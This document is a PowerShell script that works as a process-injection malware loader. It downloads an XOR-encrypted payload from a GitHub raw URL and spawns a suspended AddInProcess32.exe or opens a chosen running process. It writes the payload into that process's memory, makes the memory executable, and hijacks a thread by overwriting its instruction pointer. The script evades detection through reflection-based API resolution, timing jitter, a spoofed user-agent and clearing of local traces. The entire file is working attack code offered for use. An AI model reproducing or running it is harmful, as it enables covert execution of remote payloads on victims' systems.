param(
    [string]$Target,
    [string]$Url = "https://github.com/i25968627-ui/crispy-spoon/raw/refs/heads/main/nfasiv.bin",
    [string]$Key = "",
    [switch]$RequireRWX,
    [int]$ProcessId = 0
)

# ============================================================
# Pure-reflection native API setup — no Add-Type, no temp DLL
# ============================================================

$assemblyName = New-Object System.Reflection.AssemblyName("EniRuntime")
$assemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($assemblyName, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
$moduleBuilder = $assemblyBuilder.DefineDynamicModule("EniModule")

function New-DelegateType {
    param([Type[]]$Params, [Type]$ReturnType)
    $typeBuilder = $moduleBuilder.DefineType(
        "D_" + [Guid]::NewGuid().ToString("N"),
        [System.Reflection.TypeAttributes]::Class -bor [System.Reflection.TypeAttributes]::Public -bor [System.Reflection.TypeAttributes]::Sealed,
        [System.MulticastDelegate]
    )
    $ctor = $typeBuilder.DefineConstructor(
        [System.Reflection.MethodAttributes]::Public -bor [System.Reflection.MethodAttributes]::HideBySig -bor [System.Reflection.MethodAttributes]::SpecialName -bor [System.Reflection.MethodAttributes]::RTSpecialName,
        [System.Reflection.CallingConventions]::Standard,
        @([Object], [IntPtr])
    )
    $ctor.SetImplementationFlags([System.Reflection.MethodImplAttributes]::Runtime)
    $invoke = $typeBuilder.DefineMethod(
        "Invoke",
        [System.Reflection.MethodAttributes]::Public -bor [System.Reflection.MethodAttributes]::HideBySig -bor [System.Reflection.MethodAttributes]::NewSlot -bor [System.Reflection.MethodAttributes]::Virtual,
        $ReturnType,
        $Params
    )
    $invoke.SetImplementationFlags([System.Reflection.MethodImplAttributes]::Runtime)
    return $typeBuilder.CreateType()
}

# Delegates
$D_CreateProcessW = New-DelegateType -ReturnType ([bool]) -Params @(([IntPtr]), ([IntPtr]), ([IntPtr]), ([IntPtr]), ([bool]), ([uint32]), ([IntPtr]), ([IntPtr]), ([IntPtr]), ([IntPtr]))
$D_OpenProcess = New-DelegateType -ReturnType ([IntPtr]) -Params @(([uint32]), ([bool]), ([uint32]))
$D_OpenThread = New-DelegateType -ReturnType ([IntPtr]) -Params @(([uint32]), ([bool]), ([uint32]))
$D_VirtualAllocEx = New-DelegateType -ReturnType ([IntPtr]) -Params @(([IntPtr]), ([IntPtr]), ([IntPtr]), ([uint32]), ([uint32]))
$D_WriteProcessMemory = New-DelegateType -ReturnType ([bool]) -Params @(([IntPtr]), ([IntPtr]), ([byte[]]), ([IntPtr]), ([IntPtr].MakeByRefType()))
$D_VirtualProtectEx = New-DelegateType -ReturnType ([bool]) -Params @(([IntPtr]), ([IntPtr]), ([IntPtr]), ([uint32]), ([uint32].MakeByRefType()))
$D_NtSuspendThread = New-DelegateType -ReturnType ([int]) -Params @(([IntPtr]), ([uint32].MakeByRefType()))
$D_NtGetContextThread = New-DelegateType -ReturnType ([int]) -Params @(([IntPtr]), ([IntPtr]))
$D_NtSetContextThread = New-DelegateType -ReturnType ([int]) -Params @(([IntPtr]), ([IntPtr]))
$D_NtResumeThread = New-DelegateType -ReturnType ([int]) -Params @(([IntPtr]), ([uint32].MakeByRefType()))
$D_CloseHandle = New-DelegateType -ReturnType ([bool]) -Params @(([IntPtr]))

# Resolve Win32Native reflection helpers
$win32Native = [System.Type]::GetType('Microsoft.Win32.Win32Native')
$getModuleHandle = $win32Native.GetMethod('GetModuleHandle', [System.Reflection.BindingFlags]'NonPublic,Static', $null, @([string]), $null)
$getProcAddress = $win32Native.GetMethod('GetProcAddress', [System.Reflection.BindingFlags]'NonPublic,Static', $null, @([IntPtr], [string]), $null)

function Get-ProcAddress {
    param([string]$Module, [string]$Name)
    $hMod = $getModuleHandle.Invoke($null, @($Module))
    if ($hMod -eq [IntPtr]::Zero) { throw "Failed to get handle for $Module" }
    $ptr = $getProcAddress.Invoke($null, @($hMod, $Name))
    if ($ptr -eq [IntPtr]::Zero) { throw "Failed to resolve $Name" }
    return $ptr
}

# Bind native functions
$CreateProcessW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress 'kernel32.dll' 'CreateProcessW'), $D_CreateProcessW)
$OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress 'kernel32.dll' 'OpenProcess'), $D_OpenProcess)
$OpenThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress 'kernel32.dll' 'OpenThread'), $D_OpenThread)
$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress 'kernel32.dll' 'VirtualAllocEx'), $D_VirtualAllocEx)
$WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress 'kernel32.dll' 'WriteProcessMemory'), $D_WriteProcessMemory)
$VirtualProtectEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress 'kernel32.dll' 'VirtualProtectEx'), $D_VirtualProtectEx)
$NtSuspendThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress 'ntdll.dll' 'NtSuspendThread'), $D_NtSuspendThread)
$NtGetContextThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress 'ntdll.dll' 'NtGetContextThread'), $D_NtGetContextThread)
$NtSetContextThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress 'ntdll.dll' 'NtSetContextThread'), $D_NtSetContextThread)
$NtResumeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress 'ntdll.dll' 'NtResumeThread'), $D_NtResumeThread)
$CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress 'kernel32.dll' 'CloseHandle'), $D_CloseHandle)

# ============================================================
# Helpers
# ============================================================

function Invoke-XorDecrypt {
    param([byte[]]$Data, [string]$Key)
    if ([string]::IsNullOrEmpty($Key)) { return $Data }
    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($Key)
    $out = New-Object byte[] $Data.Length
    for ($i = 0; $i -lt $Data.Length; $i++) {
        $out[$i] = $Data[$i] -bxor $keyBytes[$i % $keyBytes.Length]
    }
    return $out
}

# ============================================================
# Host / target selection
# ============================================================

$hProcess = [IntPtr]::Zero
$hThread = [IntPtr]::Zero
$dwProcessId = 0

if ($ProcessId -gt 0) {
    # Inject into an already-running process
    $PROCESS_ALL_ACCESS = 0x1F0FFF
    $THREAD_ALL_ACCESS = 0x1FFFFF
    $hProcess = $OpenProcess.Invoke($PROCESS_ALL_ACCESS, $false, [uint32]$ProcessId)
    if ($hProcess -eq [IntPtr]::Zero) { throw "OpenProcess failed for PID $ProcessId" }
    $targetProc = Get-Process -Id $ProcessId -ErrorAction SilentlyContinue
    $firstThread = $targetProc.Threads[0].Id
    $hThread = $OpenThread.Invoke($THREAD_ALL_ACCESS, $false, [uint32]$firstThread)
    if ($hThread -eq [IntPtr]::Zero) { throw "OpenThread failed" }
    $dwProcessId = $ProcessId
    Write-Host "Target PID: $dwProcessId | Thread: $firstThread"
} else {
    # Create a fresh suspended host
    $hostPath = $null
    if ($Target) {
        $hostPath = $Target
    } else {
        $netDirs = @(
            "C:\Windows\Microsoft.NET\Framework64\v4.0.30319",
            "C:\Windows\Microsoft.NET\Framework\v4.0.30319",
            "C:\Windows\Microsoft.NET\Framework64\v2.0.50727",
            "C:\Windows\Microsoft.NET\Framework\v2.0.50727"
        )
        foreach ($dir in $netDirs) {
            $candidate = Join-Path $dir "AddInProcess32.exe"
            if (Test-Path $candidate) {
                $hostPath = $candidate
                break
            }
        }
    }
    if (-not $hostPath) { throw "No suitable host process found." }
    Write-Host "Selected host: $hostPath"

    $jitter = Get-Random -Minimum 1200 -Maximum 2800
    Start-Sleep -Milliseconds $jitter

    $siSize = if ([IntPtr]::Size -eq 8) { 104 } else { 68 }
    $piSize = if ([IntPtr]::Size -eq 8) { 24 } else { 16 }
    $siPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($siSize)
    $piPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($piSize)
    [System.Runtime.InteropServices.Marshal]::WriteInt32($siPtr, 0, $siSize)
    for ($i = 4; $i -lt $siSize; $i += 8) {
        [System.Runtime.InteropServices.Marshal]::WriteInt64($siPtr, $i, 0)
    }
    for ($i = 0; $i -lt $piSize; $i += 8) {
        [System.Runtime.InteropServices.Marshal]::WriteInt64($piPtr, $i, 0)
    }

    $CREATE_SUSPENDED = 0x00000004
    $CREATE_NO_WINDOW = 0x08000000
    $cmdLinePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("`"$hostPath`"")
    try {
        $ok = $CreateProcessW.Invoke([IntPtr]::Zero, $cmdLinePtr, [IntPtr]::Zero, [IntPtr]::Zero, $false, ($CREATE_SUSPENDED -bor $CREATE_NO_WINDOW), [IntPtr]::Zero, [IntPtr]::Zero, $siPtr, $piPtr)
    } finally {
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($cmdLinePtr)
    }
    if (-not $ok) {
        throw "CreateProcessW failed."
    }

    $hProcess = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($piPtr, 0)
    $hThread = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($piPtr, [IntPtr]::Size)
    $dwProcessId = [System.Runtime.InteropServices.Marshal]::ReadInt32($piPtr, [IntPtr]::Size * 2)

    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($siPtr)
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($piPtr)
    Write-Host "Host spawned. PID: $dwProcessId"
}

# ============================================================
# Payload retrieval
# ============================================================

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
$encrypted = $wc.DownloadData($Url)
Write-Host "Downloaded $($encrypted.Length) bytes from $Url"

$payload = Invoke-XorDecrypt -Data $encrypted -Key $Key

# ============================================================
# Allocate and write payload in target
# ============================================================

$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PAGE_READWRITE = 0x04
$PAGE_EXECUTE_READ = 0x20
$PAGE_EXECUTE_READWRITE = 0x40

$baseAddress = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, [IntPtr]$payload.Length, ($MEM_COMMIT -bor $MEM_RESERVE), $PAGE_READWRITE)
if ($baseAddress -eq [IntPtr]::Zero) {
    throw "VirtualAllocEx failed."
}
Write-Host "Allocated remote memory at 0x$($baseAddress.ToString('X'))"

$bytesWritten = [IntPtr]::Zero
$ok = $WriteProcessMemory.Invoke($hProcess, $baseAddress, $payload, [IntPtr]$payload.Length, [ref]$bytesWritten)
if (-not $ok) {
    throw "WriteProcessMemory failed."
}
Write-Host "Wrote $($bytesWritten.ToInt64()) bytes into host process"

# Flip to execute (RX by default, RWX if requested)
$finalProtect = if ($RequireRWX) { $PAGE_EXECUTE_READWRITE } else { $PAGE_EXECUTE_READ }
$oldProtect = 0
$ok = $VirtualProtectEx.Invoke($hProcess, $baseAddress, [IntPtr]$payload.Length, $finalProtect, [ref]$oldProtect)
if (-not $ok) {
    throw "VirtualProtectEx failed."
}
Write-Host "Memory protection changed to $(if($RequireRWX){'RWX'}else{'RX'})"

# Cleanup local footprint
$encrypted = $null
$payload = $null
[System.GC]::Collect()

# ============================================================
# Thread hijacking
# ============================================================

# x64 CONTEXT size = 1232, ContextFlags at 0x30, Rip at 0xF8
# x86 CONTEXT size = 716,  ContextFlags at 0x00, Eip at 0xB8
$is64 = ([IntPtr]::Size -eq 8)
$ctxSize = if ($is64) { 1232 } else { 716 }
$ctxFlagsOffset = if ($is64) { 0x30 } else { 0x00 }
$ipOffset = if ($is64) { 0xF8 } else { 0xB8 }
$CONTEXT_FULL = if ($is64) { 0x10000B } else { 0x10007 }

$ctx = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ctxSize)
for ($i = 0; $i -lt $ctxSize; $i += 8) {
    [System.Runtime.InteropServices.Marshal]::WriteInt64($ctx, $i, 0)
}
[System.Runtime.InteropServices.Marshal]::WriteInt32($ctx, $ctxFlagsOffset, $CONTEXT_FULL)

$createdProcess = ($ProcessId -le 0)

if (-not $createdProcess) {
    # Only suspend threads we didn't create ourselves
    $suspendCount = 0
    $status = $NtSuspendThread.Invoke($hThread, [ref]$suspendCount)
    if ($status -ne 0) {
        throw "NtSuspendThread failed. NTSTATUS: 0x$($status.ToString('X8'))"
    }
}

$status = $NtGetContextThread.Invoke($hThread, $ctx)
if ($status -ne 0) {
    throw "NtGetContextThread failed. NTSTATUS: 0x$($status.ToString('X8'))"
}

# Overwrite instruction pointer with payload address
if ($is64) {
    [System.Runtime.InteropServices.Marshal]::WriteInt64($ctx, $ipOffset, $baseAddress.ToInt64())
} else {
    [System.Runtime.InteropServices.Marshal]::WriteInt32($ctx, $ipOffset, $baseAddress.ToInt32())
}

$status = $NtSetContextThread.Invoke($hThread, $ctx)
if ($status -ne 0) {
    throw "NtSetContextThread failed. NTSTATUS: 0x$($status.ToString('X8'))"
}

[System.Runtime.InteropServices.Marshal]::FreeHGlobal($ctx)

# Resume until the thread is actually running (handles double-suspend cases)
$resumeAttempts = 0
$maxAttempts = if ($createdProcess) { 3 } else { 5 }
while ($resumeAttempts -lt $maxAttempts) {
    $suspendCount = 0
    $status = $NtResumeThread.Invoke($hThread, [ref]$suspendCount)
    if ($status -ne 0) {
        throw "NtResumeThread failed. NTSTATUS: 0x$($status.ToString('X8'))"
    }
    if ($suspendCount -eq 0) { break }
    $resumeAttempts++
}

Write-Host "Thread hijacked and resumed. Monitoring..."

# ============================================================
# Monitor
# ============================================================

$hostProc = Get-Process -Id $dwProcessId -ErrorAction SilentlyContinue
while ($hostProc -and -not $hostProc.HasExited) {
    $hostProc.Refresh()
    $ws = [math]::Round($hostProc.WorkingSet64 / 1KB, 2)
    $tc = $hostProc.Threads.Count
    Write-Host "$(Get-Date -Format 'HH:mm:ss') | PID: $dwProcessId | WS: ${ws} KB | Threads: $tc"
    Start-Sleep -Seconds 8
    $hostProc = Get-Process -Id $dwProcessId -ErrorAction SilentlyContinue
}

try {
    $exitCode = $hostProc.ExitCode
    Write-Host "Host process exited with code: $exitCode"
} catch {
    Write-Host "Host process exited."
}

[void]$CloseHandle.Invoke($hThread)
[void]$CloseHandle.Invoke($hProcess)
